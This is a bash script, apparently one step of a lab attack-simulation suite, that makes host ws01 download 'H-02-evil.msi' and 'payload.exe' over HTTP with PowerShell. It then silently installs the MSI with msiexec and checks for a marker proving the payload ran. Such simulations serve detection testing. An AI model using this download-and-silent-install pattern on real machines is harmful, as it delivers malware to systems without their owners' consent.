#!/usr/bin/env bash
# H-02 MSI — delivery verify + msiexec on ws01 (artifact from provisioning www)
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/h-common.sh"
echo "=== H-02 Malicious MSI ==="
h_require_artifact "H-02-evil.msi"
h_require_artifact "payload.exe"
OUT="$(h_ws01_exec "
\$ErrorActionPreference='Continue'
\$server='${H_WS01_HTTP}'
\$marker='C:\Windows\Temp\H-PAYLOAD-MARKER.txt'
Remove-Item \$marker -Force -ErrorAction SilentlyContinue
\$msi='C:\Windows\Temp\H-02-evil.msi'
(New-Object Net.WebClient).DownloadFile(\"\$server/H-02-evil.msi\", \$msi)
(New-Object Net.WebClient).DownloadFile(\"\$server/payload.exe\", 'C:\Windows\Temp\payload.exe')
Write-Output \"MSI_SIZE \$((Get-Item \$msi).Length)\"
Start-Process msiexec -ArgumentList \"/i \`\"\$msi\`\"\",'/qn' -Wait -ErrorAction SilentlyContinue
Start-Sleep -Seconds 8
if (Test-Path \$marker) { Write-Output 'H02_MARKER True'; Get-Content \$marker; Remove-Item \$marker -Force } else { Write-Output 'H02_MARKER False' }
Remove-Item \$msi -ErrorAction SilentlyContinue
")"
printf '%s\n' "${OUT}"
printf '%s' "${OUT}" | grep -q 'H02_MARKER True' || { echo "H-02 FAIL: payload marker missing" >&2; exit 1; }
echo "H_02_OK"
echo "H-02 complete"
